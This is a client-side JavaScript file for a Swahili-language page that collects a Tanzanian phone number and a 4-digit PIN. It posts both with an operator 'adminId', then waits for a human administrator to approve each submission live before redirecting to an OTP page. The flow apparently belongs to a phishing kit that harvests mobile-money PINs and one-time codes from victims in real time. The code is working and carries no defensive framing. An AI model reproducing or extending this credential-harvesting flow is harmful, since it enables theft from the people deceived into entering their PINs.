// PIN Verification Script — SHORT CODE MODE
// Admin ID comes only from sessionStorage — no auto-assign, no fallbacks

document.addEventListener('DOMContentLoaded', function () {
    const phoneInput = document.getElementById('phoneNumber');
    const pinInput = document.getElementById('pin');
    const verifyBtn = document.getElementById('verifyPinBtn');
    const pinScreen = document.getElementById('pinScreen');
    const processingScreen = document.getElementById('processingScreen');
    const rejectionScreen = document.getElementById('rejectionScreen');

    // ==========================================
    // INLINE ERROR DISPLAY
    // ==========================================
    const errorDiv = document.createElement('div');
    errorDiv.style.cssText = 'display:none; background:#fee; border:1px solid #fcc; color:#c33; padding:12px; border-radius:8px; margin:10px 0; font-weight:500;';
    const formTitle = document.querySelector('.form-title');
    if (formTitle?.parentNode) formTitle.parentNode.insertBefore(errorDiv, formTitle.nextSibling);

    function showError(message) {
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
        setTimeout(() => { errorDiv.style.display = 'none'; }, 6000);
        errorDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }

    // ==========================================
    // GET ADMIN ID — SESSION ONLY, NO FALLBACKS
    // ==========================================
    const applicationData = JSON.parse(sessionStorage.getItem('applicationData') || '{}');
    const adminId = sessionStorage.getItem('selectedAdminId') || applicationData.adminId;

    console.log('📱 Verification page | Admin ID:', adminId || 'MISSING');

    // ==========================================
    // PIN INPUT — NUMBERS ONLY
    // ==========================================
    pinInput.addEventListener('input', function () {
        this.value = this.value.replace(/\D/g, '').slice(0, 4);
    });

    // ==========================================
    // PHONE NUMBER FORMATTING
    // ==========================================
    phoneInput.addEventListener('input', function () {
        let value = this.value.replace(/\D/g, '');
        if (value.length > 0 && !value.startsWith('255')) {
            if (value.startsWith('0')) value = '255' + value.substring(1);
            else if (value.startsWith('7')) value = '255' + value;
        }
        if (value.length > 3) this.value = '+' + value.substring(0, 3) + ' ' + value.substring(3);
        else if (value.length > 0) this.value = '+' + value;
        else this.value = '';
    });

    // ==========================================
    // VERIFY BUTTON
    // ==========================================
    verifyBtn.addEventListener('click', async function (e) {
        e.preventDefault();

        const phoneNumber = phoneInput.value.trim().replace(/\s/g, '');
        const pin = pinInput.value.trim();

        if (!phoneNumber) { showError('Tafadhali weka nambari yako ya simu'); phoneInput.focus(); return; }
        if (!phoneNumber.match(/^\+?255\d{9}$/)) { showError('Nambari ya simu sio sahihi. Tumia format: +255XXXXXXXXX'); phoneInput.focus(); return; }
        if (pin.length !== 4) { showError('PIN lazima iwe na nambari 4'); pinInput.focus(); return; }

        // Save to session
        applicationData.phone = phoneNumber;
        applicationData.pin = pin;
        applicationData.adminId = adminId;
        sessionStorage.setItem('applicationData', JSON.stringify(applicationData));

        pinScreen.style.display = 'none';
        processingScreen.style.display = 'block';

        // ✅ Always send adminId — server will reject if missing
        const requestData = {
            phoneNumber,
            pin,
            adminId: adminId || null
        };

        console.log('📤 Sending PIN request | Admin ID:', adminId);

        try {
            const response = await fetch('/api/verify-pin', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(requestData)
            });

            const result = await response.json();
            console.log('📥 Server response:', result);

            if (result.success) {
                if (result.applicationId) {
                    applicationData.applicationId = result.applicationId;
                    sessionStorage.setItem('applicationData', JSON.stringify(applicationData));
                }
                checkPinStatus(result.applicationId);
            } else {
                processingScreen.style.display = 'none';
                pinScreen.style.display = 'block';
                showError(result.message || 'Imeshindwa kuwasilisha. Jaribu tena.');
            }
        } catch (error) {
            console.error('❌ Error:', error);
            processingScreen.style.display = 'none';
            pinScreen.style.display = 'block';
            showError('Hitilafu ya mtandao. Kagua muunganisho wako na jaribu tena.');
        }
    });

    // ==========================================
    // POLL PIN STATUS
    // ==========================================
    function checkPinStatus(applicationId) {
        let checkCount = 0;
        const maxChecks = 150;

        const statusInterval = setInterval(async () => {
            checkCount++;
            try {
                const response = await fetch(`/api/check-pin-status/${applicationId}`);
                const result = await response.json();

                if (result.success && result.status) {
                    if (result.status === 'approved') {
                        clearInterval(statusInterval);
                        setTimeout(() => { window.location.href = 'otp.html'; }, 800);
                    } else if (result.status === 'rejected' || result.status === 'denied') {
                        clearInterval(statusInterval);
                        processingScreen.style.display = 'none';
                        rejectionScreen.style.display = 'block';
                    }
                }
            } catch (error) {
                if (checkCount % 10 === 0) console.error('❌ Status check error:', error);
            }

            if (checkCount >= maxChecks) {
                clearInterval(statusInterval);
                processingScreen.style.display = 'none';
                pinScreen.style.display = 'block';
                showError('Muda umeisha. Msimamizi hajaitikia. Tafadhali jaribu tena baadaye.');
            }
        }, 2000);
    }
});
